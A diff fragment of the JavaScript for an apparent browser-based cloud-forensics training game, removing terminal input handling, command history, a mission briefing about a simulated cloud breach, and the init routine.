-            if (cmd) {
-                STATE.commandHistory.push(cmd);
-                STATE.historyIndex = STATE.commandHistory.length;
-                executeCommand(cmd);
-            }
-            this.value = '';
-        } else if (e.key === 'ArrowUp') {
-            e.preventDefault();
-            if (STATE.historyIndex > 0) {
-                STATE.historyIndex--;
-                this.value = STATE.commandHistory[STATE.historyIndex];
-            }
-        } else if (e.key === 'ArrowDown') {
-            e.preventDefault();
-            if (STATE.historyIndex < STATE.commandHistory.length - 1) {
-                STATE.historyIndex++;
-                this.value = STATE.commandHistory[STATE.historyIndex];
-            } else {
-                STATE.historyIndex = STATE.commandHistory.length;
-                this.value = '';
-            }
-        }
-    });
-
-    // Click anywhere in terminal panel to focus input
-    document.getElementById('term-panel').addEventListener('click', function(e) {
-        if (e.target.tagName !== 'INPUT') input.focus();
-    });
-}
-
-// ═══ Mission Briefing ═══
-
-function showBriefing() {
-    printLine('\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557', 'heading');
-    printLine('\u2551  MISSION: FORENSICS-02 \u2014 CLOUD ARTIFACT    \u2551', 'heading');
-    printLine('\u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563', 'heading');
-    printLine('\u2551  Cloud environment breach detected.         \u2551', 'heading');
-    printLine('\u2551  Stolen API keys. IAM escalation.          \u2551', 'heading');
-    printLine('\u2551  S3 exfiltration. Lambda backdoor.         \u2551', 'heading');
-    printLine('\u2551  Investigate. Build the incident report.   \u2551', 'heading');
-    printLine('\u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D', 'heading');
-    printLine('', 'system');
-    printLine('[SYS] Investigator online at CLOUDTRAIL (us-east-1)', 'success');
-    printLine('[SYS] Type "help" for command reference', 'info');
-    printLine('[SYS] Type "examine" to inspect current service', 'info');
-    printLine('', 'system');
-}
-
-// ═══ Init ═══
-
-function init() {
-    buildGrid();
-    setupInput();
-
-    var restored = loadState();
-    if (restored && !STATE.completed) {
-        printLine('[SYS] Session restored from save.', 'system');
-        printLine('[SYS] Type "status" to review investigation progress.', 'info');
-        printLine('', 'system');
-    } else {
-        resetState();
-        showBriefing();
-    }
-
-    updateGrid();
-    updateObjectivesUI();
-    document.getElementById('term-input').focus();
-}
-
-document.addEventListener('DOMContentLoaded', init);
-</script>
-
+    })();
+    </script>
 </body>
 </html>
